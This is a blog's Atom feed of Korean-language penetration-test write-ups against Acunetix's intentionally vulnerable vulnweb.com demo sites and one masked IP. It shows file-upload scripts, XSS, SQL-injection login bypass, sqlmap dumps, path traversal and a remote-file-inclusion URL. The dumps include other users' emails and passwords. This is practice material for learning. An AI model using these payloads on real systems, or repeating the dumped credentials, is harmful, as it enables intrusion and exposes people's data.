@@ -1,0 +1,1105 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-12-25T18:51:30+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">A1mH1gh</title><subtitle>Security Log</subtitle><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><entry><title type="html">[ VulnWebs ] - x.x.137.97</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-x.x.137.97/" rel="alternate" type="text/html" title="[ VulnWebs ] - x.x.137.97" /><published>2022-12-05T00:00:00+09:00</published><updated>2022-12-05T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-x.x.137.97</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-x.x.137.97/"><![CDATA[<h2 id="recon">RECON</h2>
+<p><img src="https://user-images.githubusercontent.com/100695923/205664962-b0c2e15b-1331-465f-87ba-42e5eb7e76d5.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS: CentOS
+WAS: Apache/2.4.6
+Lang: PHP/7.2.34
+</code></pre></div></div>
+<h2 id="file-upload">File Upload</h2>
+<p>업로드 페이지가 존재하며</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://x.x.137.97/upload.php
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205656810-8e11319f-3e18-48ef-8a83-6ddd5428e341.png" alt="image" /></p>
+
+<p>확장자 ‘.php’를 가지는 php코드 파일을 업로드 시도</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://x.x.137.97/upload.php'</span>
+<span class="n">files</span><span class="o">=</span><span class="p">{</span> <span class="s">'userfile'</span><span class="p">:</span> <span class="p">(</span><span class="s">'test.php'</span><span class="p">,</span> <span class="s">'&lt;?php echo "Hello there!" ?&gt;'</span><span class="p">)</span> <span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div>
+<p>정상 업로드되었으며 특이점으로는 ‘업로드 경로’를 친절히 반환함
+<img src="https://user-images.githubusercontent.com/100695923/205665845-1508f37c-4158-4a28-98c4-f85658178c69.png" alt="image" /></p>
+
+<p>업로드 경로로 ‘URL 접속’할 경우 서버사이드스크립트가 실행</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://x.x.137.97/upload/test.php
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205656295-a57f0379-b4da-4360-87fd-2f36eb041c26.png" alt="image" /></p>
+
+<p>두번째 테스트 서버(x.x.137.97:8080)에서도 위와 마찬가지, 다만 jsp환경임을 고려하여 파일명(test.jsp)와 페이로드(아래)을 적용해야함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://x.x.137.97:8080/upload.jsp
+</code></pre></div></div>
+<p>위와 같은 서버스크립트가 실행됨, 아래는 페이로드</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%@ page import="java.util.*,java.io.*"%&gt;
+&lt;%
+	out.println("Hello");
+%&gt;
+</code></pre></div></div>
+<p><br />
+<br />
+<br />
+Done.</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[RECON OS: CentOS WAS: Apache/2.4.6 Lang: PHP/7.2.34 File Upload 업로드 페이지가 존재하며 http://x.x.137.97/upload.php 확장자 ‘.php’를 가지는 php코드 파일을 업로드 시도 import requests url = 'http://x.x.137.97/upload.php' files={ 'userfile': ('test.php', '&lt;?php echo "Hello there!" ?&gt;') } r = requests.post(url, files=files) print(r.text) 정상 업로드되었으며 특이점으로는 ‘업로드 경로’를 친절히 반환함 업로드 경로로 ‘URL 접속’할 경우 서버사이드스크립트가 실행 http://x.x.137.97/upload/test.php 두번째 테스트 서버(x.x.137.97:8080)에서도 위와 마찬가지, 다만 jsp환경임을 고려하여 파일명(test.jsp)와 페이로드(아래)을 적용해야함 http://x.x.137.97:8080/upload.jsp 위와 같은 서버스크립트가 실행됨, 아래는 페이로드 &lt;%@ page import="java.util.*,java.io.*"%&gt; &lt;% out.println("Hello"); %&gt; Done.]]></summary></entry><entry><title type="html">[ VulnWebs ] - testaspnet.vulnweb.com</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-testaspnet.vulnweb.com/" rel="alternate" type="text/html" title="[ VulnWebs ] - testaspnet.vulnweb.com" /><published>2022-12-03T00:00:00+09:00</published><updated>2022-12-03T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-testaspnet.vulnweb.com</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-testaspnet.vulnweb.com/"><![CDATA[<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482508-0512491f-7087-441e-8ba6-bc7be53be8dc.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207843647-0a55e1df-2d7e-4283-bd8f-bdf765c3ebda.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS: Windows Server
+WAS: IIS/8.5
+Lang: ASP.NET
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205478205-315ba4c8-714d-4f1b-9730-c320ea5f27e2.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/205478263-20887909-d6dd-45e5-adb9-f0d1851c453c.png" alt="image" /></p>
+
+<h2 id="information-leakage">Information Leakage</h2>
+<p>서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/test
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205478944-0e4ba386-61e5-4a33-a6b8-5e78fcdc7bfe.png" alt="image" /></p>
+
+<h2 id="xss">XSS</h2>
+<p>답글을 등록하는 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/Comments.aspx
+</code></pre></div></div>
+<p>스크립트를 삽입하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205478467-b666664b-2aa7-452a-b77f-8927b10ba841.png" alt="image" /></p>
+
+<p>스크립트가 실행됨
+<img src="https://user-images.githubusercontent.com/100695923/205478477-209e3e7a-2f2b-42e8-b3b0-d948aeb5b2bd.png" alt="image" /></p>
+
+<h2 id="sqli">SQLi</h2>
+<h3 id="sqli-1">SQLi-1</h3>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/login.aspx
+</code></pre></div></div>
+<p>아래 SQLi 문구를 입력해주면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' or '1'='1'-- 
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207756474-a8f65c32-f109-4938-b96d-585c22a1ae05.png" alt="image" /></p>
+
+<p>Admin으로 로그인됨<br />
+로그인 시 조회하는 Tables에 첫 컬럼이 admin으로 저장되어 있기에 가능함
+<img src="https://user-images.githubusercontent.com/56434196/207756538-4481dadf-86a9-4172-8a92-f7b472ce4147.png" alt="image" /></p>
+
+<h3 id="sqli-2">SQLi-2</h3>
+<p>DB를 조회하는 페이지를 확인</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/ReadNews.aspx?id=0
+</code></pre></div></div>
+<p>DB명 확인</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>λ python sqlmap.py -u "http://testaspnet.vulnweb.com/ReadNews.aspx?id=0" -dbs
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.3.19#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=0 AND 8054=8054
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: id=0;WAITFOR DELAY '0:0:5'--
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (IF)
+    Payload: id=0 WAITFOR DELAY '0:0:5'
+---
+available databases [6]:
+[*] acuforum
+[*] acuservice
+[*] master
+[*] model
+[*] msdb
+[*] tempdb
+</code></pre></div></div>
+<p>Table 확인</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://testaspnet.vulnweb.com/ReadNews.aspx?id=0" -D acuforum -tables
+Database: acuforum
+[4 tables]
++---------+
+| forums  |
+| posts   |
+| threads |
+| users   |
++---------+
+
+</code></pre></div></div>
+<p>Columns 확인</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python sqlmap.py -u "http://testaspnet.vulnweb.com/ReadNews.aspx?id=0" -D acuforum -T users -dump
+ Database: acuforum
+Table: users
+[8 entries]
++-------------------------------------+--------------+-------------+---------+---------------------+
+| email                               | uname        | upass       | avatar  | realname            |
++-------------------------------------+--------------+-------------+---------+---------------------+
+| admin@adminspace.com                | admin        | none        | &lt;blank&gt; | admin the allmighty |
+| olesya.zhukova.1994@bk.ru           | Emanuelhicup | 83sb9peQp$L | &lt;blank&gt; | Emanuelhicup        |
+| yana-sokolova-2023@list.ru          | Jameskaf     | 6vbgc&amp;2f4KE | &lt;blank&gt; | Jameskaf            |
+| smirnova.liudmila.1980.30.1@mail.ru | JeraldFoulk  | xzj@3Kyt14A | &lt;blank&gt; | JeraldFoulk         |
+| yourmail@gmail.com                  | JustinBoody  | %z9cv57JooJ | &lt;blank&gt; | JustinBoody         |
+| iurkova.nataliia.1981.11.6@inbox.ru | JustinWeite  | 57etus&amp;tZ1X | &lt;blank&gt; | JustinWeite         |
+| lala                                | rawbite      | none        | &lt;blank&gt; | lala                |
+| tinabr5@ho                          | &lt;blank&gt;      | &lt;blank&gt;     | &lt;blank&gt; | &lt;blank&gt;             |
++-------------------------------------+--------------+-------------+---------+---------------------+
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ID: admin
+PW: none
+</code></pre></div></div>
+
+<h2 id="cleartext-transmission">Cleartext Transmission</h2>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/login.aspx
+</code></pre></div></div>
+<p>평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음<br />(인코딩 및 암호화되지 않음)
+<img src="https://user-images.githubusercontent.com/100695923/205484511-a2d2ee34-3f1b-4b1c-b8fb-191ff0db2518.png" alt="image" /></p>
+
+<h2 id="insufficient-session-expiration">Insufficient Session Expiration</h2>
+<p>‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음
+<br />로그인 직후 모습 
+<img src="https://user-images.githubusercontent.com/56434196/207785149-f465b33b-3edb-46ec-a3d3-805e81e3eaa8.png" alt="image" /></p>
+
+<p>1시간 경과 모습
+<img src="https://user-images.githubusercontent.com/56434196/207785176-ccb8fa8a-ecd9-4365-a076-ee5dba33e9fe.png" alt="image" /></p>
+
+<h2 id="etc">ETC</h2>
+<h3 id="remote-file-inclusion">Remote File Inclusion</h3>
+<p>자동진단 툴 실행 결과 ‘외부 스크립트’ 파일을 참조하는 페이지가 존재함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://testaspnet.vulnweb.com/ReadNews.aspx?id=0&amp;NewsAd=1234
+</code></pre></div></div>
+<p>공격자의 스크립트 파일을 불러와 페이지를 구성하여 반환함</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp;NewsAd=http://xss.rocks/xss.js
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207747053-41b77291-15ee-438b-abe9-f4ac8fe02254.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/56434196/207747474-40adf19d-fc89-4c07-9f1c-8f60ffde3fcd.png" alt="image" /></p>
+
+<h2 id="automated-attack">Automated Attack</h2>
+<p>댓글을 등록하는 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testaspnet.vulnweb.com/Comments.aspx?id=3
+</code></pre></div></div>
+<p>‘댓글 달기’ 요청 패킷을 동시에 11건 발송을 시도
+<img src="https://user-images.githubusercontent.com/56434196/207757818-c1de318a-d873-4ead-9cb6-6250f706d2a9.png" alt="image" /></p>
+
+<p>초당 사용자 요청 횟수를 제한하지 않아 모든 요청패킷이 처리되었고<br />제한되지 않은 요청처리로 인해 서버 Dos가 공격자에 의해 수행될수있음
+<img src="https://user-images.githubusercontent.com/56434196/207757904-badbc3d4-0323-4ba3-8078-e59a3b8e373c.png" alt="image" />
+<br />
+<br />
+<br />
+Done.</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[RECON OS: Windows Server WAS: IIS/8.5 Lang: ASP.NET Information Leakage 서버 내 미존재 페이지에 접속할 경우 에러페이지가 반환되며 서버 정보관련 정보를 노출하고 있음 http://testaspnet.vulnweb.com/test XSS 답글을 등록하는 페이지에서 http://testaspnet.vulnweb.com/Comments.aspx 스크립트를 삽입하면 &lt;script&gt;alert(document.domain)&lt;/script&gt; 스크립트가 실행됨 SQLi SQLi-1 로그인 페이지에서 http://testaspnet.vulnweb.com/login.aspx 아래 SQLi 문구를 입력해주면 ' or '1'='1'-- Admin으로 로그인됨 로그인 시 조회하는 Tables에 첫 컬럼이 admin으로 저장되어 있기에 가능함 SQLi-2 DB를 조회하는 페이지를 확인 http://testaspnet.vulnweb.com/ReadNews.aspx?id=0 DB명 확인 λ python sqlmap.py -u "http://testaspnet.vulnweb.com/ReadNews.aspx?id=0" -dbs ___ __H__ ___ ___[(]_____ ___ ___ {1.6.3.19#dev} |_ -| . [,] | .'| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=0 AND 8054=8054 Type: stacked queries Title: Microsoft SQL Server/Sybase stacked queries (comment) Payload: id=0;WAITFOR DELAY '0:0:5'-- Type: time-based blind Title: Microsoft SQL Server/Sybase time-based blind (IF) Payload: id=0 WAITFOR DELAY '0:0:5' --- available databases [6]: [*] acuforum [*] acuservice [*] master [*] model [*] msdb [*] tempdb Table 확인 python sqlmap.py -u "http://testaspnet.vulnweb.com/ReadNews.aspx?id=0" -D acuforum -tables Database: acuforum [4 tables] +---------+ | forums | | posts | | threads | | users | +---------+ Columns 확인 python sqlmap.py -u "http://testaspnet.vulnweb.com/ReadNews.aspx?id=0" -D acuforum -T users -dump Database: acuforum Table: users [8 entries] +-------------------------------------+--------------+-------------+---------+---------------------+ | email | uname | upass | avatar | realname | +-------------------------------------+--------------+-------------+---------+---------------------+ | admin@adminspace.com | admin | none | &lt;blank&gt; | admin the allmighty | | olesya.zhukova.1994@bk.ru | Emanuelhicup | 83sb9peQp$L | &lt;blank&gt; | Emanuelhicup | | yana-sokolova-2023@list.ru | Jameskaf | 6vbgc&amp;2f4KE | &lt;blank&gt; | Jameskaf | | smirnova.liudmila.1980.30.1@mail.ru | JeraldFoulk | xzj@3Kyt14A | &lt;blank&gt; | JeraldFoulk | | yourmail@gmail.com | JustinBoody | %z9cv57JooJ | &lt;blank&gt; | JustinBoody | | iurkova.nataliia.1981.11.6@inbox.ru | JustinWeite | 57etus&amp;tZ1X | &lt;blank&gt; | JustinWeite | | lala | rawbite | none | &lt;blank&gt; | lala | | tinabr5@ho | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; | +-------------------------------------+--------------+-------------+---------+---------------------+ ID: admin PW: none Cleartext Transmission 로그인 페이지에서 http://testaspnet.vulnweb.com/login.aspx 평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음) Insufficient Session Expiration ‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음 로그인 직후 모습 1시간 경과 모습 ETC Remote File Inclusion 자동진단 툴 실행 결과 ‘외부 스크립트’ 파일을 참조하는 페이지가 존재함 https://testaspnet.vulnweb.com/ReadNews.aspx?id=0&amp;NewsAd=1234 공격자의 스크립트 파일을 불러와 페이지를 구성하여 반환함 &amp;NewsAd=http://xss.rocks/xss.js Automated Attack 댓글을 등록하는 페이지에서 http://testaspnet.vulnweb.com/Comments.aspx?id=3 ‘댓글 달기’ 요청 패킷을 동시에 11건 발송을 시도 초당 사용자 요청 횟수를 제한하지 않아 모든 요청패킷이 처리되었고제한되지 않은 요청처리로 인해 서버 Dos가 공격자에 의해 수행될수있음 Done.]]></summary></entry><entry><title type="html">[ VulnWebs ] - testhtml5.vulnweb.com</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-testhtml5.vulnweb.com/" rel="alternate" type="text/html" title="[ VulnWebs ] - testhtml5.vulnweb.com" /><published>2022-12-03T00:00:00+09:00</published><updated>2022-12-03T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-testhtml5.vulnweb.com</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-testhtml5.vulnweb.com/"><![CDATA[<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205484966-fd6a0956-8c72-4b70-b016-03cd935a9b20.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207834708-d3a6ff8c-97c3-4e7a-86e3-a50de585e66d.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<p><img src="https://user-images.githubusercontent.com/56434196/205794576-e058c95c-f44a-4781-a947-8b01067ea358.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WAS: Nginx/1.19.0
+</code></pre></div></div>
+
+<h2 id="xss">XSS</h2>
+
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testhtml5.vulnweb.com/#/popular
+</code></pre></div></div>
+<p>스크립트 구문으로 로그인 하면</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205485923-ad764ecc-24fc-4f9f-a7e4-7736cab17cbc.png" alt="image" /></p>
+
+<p>스크립트 실행됨
+<img src="https://user-images.githubusercontent.com/100695923/205485943-c9e64564-ff53-41aa-a157-d997f80ef044.png" alt="image" /></p>
+
+<h2 id="cleartext-transmission">Cleartext Transmission</h2>
+<p>로그인 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testhtml5.vulnweb.com/#/popular
+</code></pre></div></div>
+<p>평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음<br />(인코딩 및 암호화되지 않음)
+<img src="https://user-images.githubusercontent.com/56434196/205794005-b3e37a87-96d9-40e9-a4ff-046a2a794792.png" alt="image" /></p>
+
+<h2 id="insufficient-session-expiration">Insufficient Session Expiration</h2>
+<p>‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음
+<br />로그인 직후 모습 
+<img src="https://user-images.githubusercontent.com/56434196/207785230-1174191e-f93b-48c4-9ab0-cde4136a0dd8.png" alt="image" /></p>
+
+<p>1시간 경과 모습
+<img src="https://user-images.githubusercontent.com/56434196/207785243-6a329280-4e22-4f3a-83da-92a5f6d0cb5c.png" alt="image" /></p>
+
+<h2 id="position-leakage">Position Leakage</h2>
+<p>자동점검 툴을 통해 아래 디렉토리를 발견, 사용자에게 불필요한 정보 공개가 되고있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testhtml5.vulnweb.com/samples/
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/56434196/207750969-2eaf9034-d9ee-4765-930a-67a744384c65.png" alt="image" /></p>
+
+<p><br />
+<br />
+<br />
+Done.</p>]]></content><author><name>A1mH1gh</name><email>A1mH1gh4909@gmail.com</email></author><category term="VulnWebs_Writeup" /><summary type="html"><![CDATA[RECON WAS: Nginx/1.19.0 XSS 로그인 페이지에서 http://testhtml5.vulnweb.com/#/popular 스크립트 구문으로 로그인 하면 &lt;script&gt;alert(document.domain)&lt;/script&gt; 스크립트 실행됨 Cleartext Transmission 로그인 페이지에서 http://testhtml5.vulnweb.com/#/popular 평문통신(http)를 사용하고 있으며 중요정보(ID/PW)가 평문으로 전송되고 있음(인코딩 및 암호화되지 않음) Insufficient Session Expiration ‘자리 비움’ 상태에서 1시간이 지나도 세션이 유지되고 있으므로 세션관리가 이루어지고 있지 않음 로그인 직후 모습 1시간 경과 모습 Position Leakage 자동점검 툴을 통해 아래 디렉토리를 발견, 사용자에게 불필요한 정보 공개가 되고있음 http://testhtml5.vulnweb.com/samples/ Done.]]></summary></entry><entry><title type="html">[ VulnWebs ] - testasp.vulnweb.com</title><link href="http://localhost:4000/vulnwebs_writeup/VulnWebs-testasp.vulnweb.com/" rel="alternate" type="text/html" title="[ VulnWebs ] - testasp.vulnweb.com" /><published>2022-12-02T00:00:00+09:00</published><updated>2022-12-02T00:00:00+09:00</updated><id>http://localhost:4000/vulnwebs_writeup/%5BVulnWebs%5D-testasp.vulnweb.com</id><content type="html" xml:base="http://localhost:4000/vulnwebs_writeup/VulnWebs-testasp.vulnweb.com/"><![CDATA[<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/205482499-3e65057b-a68f-43e2-90fb-3f2e1f8dc4ce.png" alt="image" /></p>
+
+<p class="text-center"><img src="https://user-images.githubusercontent.com/100695923/207834396-2d5aa9fb-a6ae-4a38-98cd-57f3c30c0465.png" alt="image" /></p>
+
+<h2 id="recon">RECON</h2>
+<p><img src="https://user-images.githubusercontent.com/100695923/205470526-da761477-cf3d-4813-87be-1475066cb37b.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/205470570-9ebbe877-c816-4bbc-9703-eecaf9064820.png" alt="image" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS: Windows Server
+WAS: Microsoft-IIS/8.5
+Lang: ASP.NET
+</code></pre></div></div>
+<h2 id="information-leakage">Information Leakage</h2>
+<p>임의값을 전송하여 서버 에러를 유발시켜 서버 정보를 노출시킴</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testasp.vulnweb.com/showforum.asp?id=asdasd
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205470909-85816a32-134a-4304-bdb1-75a703e772fc.png" alt="image" /></p>
+
+<h2 id="path-traversal">Path Traversal</h2>
+<p>사용자로부터 Include 페이지를 입력받는 기능이 존재</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testasp.vulnweb.com/Templatize.asp?item=html/about.html
+</code></pre></div></div>
+<p>서버의 내부 설정파일을 불러오는데 성공</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?item=../../../../../Windows/System32/drivers/etc/hosts
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205470741-fedf34de-cc7b-49a4-b446-f3f1d1776575.png" alt="image" /></p>
+
+<h2 id="sqli">SQLi</h2>
+<p>‘로그인 페이지’ 및 ‘공지사항 페이지’ 에 파라미터값을 SQL구문으로 전송할 경우 공격자가 의도한 결과를 얻어낼수있음
+<br />ex) 로그인 우회, 내부 DB 열람, …</p>
+<h3 id="sqli-1">SQLi-1</h3>
+<p>로그인 페이지가 존재하며</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testasp.vulnweb.com/Login.asp
+</code></pre></div></div>
+<p>PW 입력값에 SQL쿼리를 넣어주었을 때
+<img src="https://user-images.githubusercontent.com/100695923/205473112-cb7f3313-c8bc-4e49-b363-dd945e477a29.png" alt="image" /></p>
+
+<p>admin으로 로그인 성공
+<img src="https://user-images.githubusercontent.com/100695923/205473125-12afe4a4-1671-4bee-a990-667e02ed056f.png" alt="image" /></p>
+
+<h3 id="sqli-2">SQLi-2</h3>
+<p>공지사항 글번호를 입력받는 페이지가 존재하며 원래 서버가 기대하는 페이지 번호가 아닌 SQL구문을 삽입하여 DB정보를 획득할 수 있음</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://testasp.vulnweb.com/showthread.asp?id=10" --dbs
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6.3.19#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+---
+Parameter: id (GET)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: id=10;WAITFOR DELAY '0:0:5'--
+---
+
+[13:05:39] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, ASP, Microsoft IIS 8.5
+back-end DBMS: Microsoft SQL Server 2014
+[13:05:39] [INFO] fetching database names
+[13:05:39] [INFO] fetching number of databases
+[13:05:39] [INFO] resumed: 7
+[13:05:39] [INFO] resumed: acuforum
+[13:05:39] [INFO] resumed: acuservice
+[13:05:39] [INFO] resumed: master
+[13:05:39] [INFO] resumed: model
+[13:05:39] [INFO] resumed: msdb
+[13:05:39] [INFO] resumed: tempdb
+</code></pre></div></div>
+<p>Table 명 확인</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://testasp.vulnweb.com/showthread.asp?id=10" -D acuforum --tables
+Database: acuforum
+[4 tables]
++---------+
+| forums  |
+| posts   |
+| threads |
+| users   |
++---------+
+</code></pre></div></div>
+<p>Columns</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sqlmap.py -u "http://testasp.vulnweb.com/showthread.asp?id=10" -D acuforum -T users --dump
+Database: acuforum
+Table: users
+[4 entries]
++-------------------------------------+--------------+-------------+---------+---------------------+
+| email                               | uname        | upass       | avatar  | realname            |
++-------------------------------------+--------------+-------------+---------+---------------------+
+| 1337                                | 1337         | 1337        | &lt;blank&gt; | 1337                |
+| admin@adminspace.com                | admin        | none        | &lt;blank&gt; | admin the allmighty |
+| karebiveresemkelirmanners@gmail.com | griella      | y1!7aon2EjH | &lt;blank&gt; | griella             |
+| oliviaclara3120@gmail.com           | Prestonwarve | &amp;nu91X      | &lt;blank&gt; | Prestonwarve        |
++-------------------------------------+--------------+-------------+---------+---------------------+
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ID: admin
+PW: none
+</code></pre></div></div>
+
+<h2 id="xss">XSS</h2>
+<h3 id="xss-1">XSS-1</h3>
+
+<p>회원가입 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testasp.vulnweb.com/Register.asp
+</code></pre></div></div>
+<p>‘ID 입력 폼’ 에 스크립트 구문 삽입</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre></div></div>
+<p><img src="https://user-images.githubusercontent.com/100695923/205473290-be68847c-9f48-464f-8249-0b0d43a7003a.png" alt="image" /></p>
+
+<p>회원가입 성공 후 로그인
+<img src="https://user-images.githubusercontent.com/100695923/205473321-9c738f0f-aef2-469c-853e-8c8219bcd401.png" alt="image" /></p>
+
+<p>로그인 사용자명이 페이지 내에 반환되어 스크립트 실행됨
+<img src="https://user-images.githubusercontent.com/100695923/205473341-30d0a737-84df-477d-b955-adebdaf729e6.png" alt="image" />
+<img src="https://user-images.githubusercontent.com/100695923/205473346-4e0889d4-e76a-46e2-ada7-6bb51cfdcfd6.png" alt="image" /></p>
+
+<h3 id="xss-2">XSS-2</h3>
+<p>포럼 글쓰기 페이지에서</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://testasp.vulnweb.com/showforum.asp?id=2
+</code></pre></div></div>
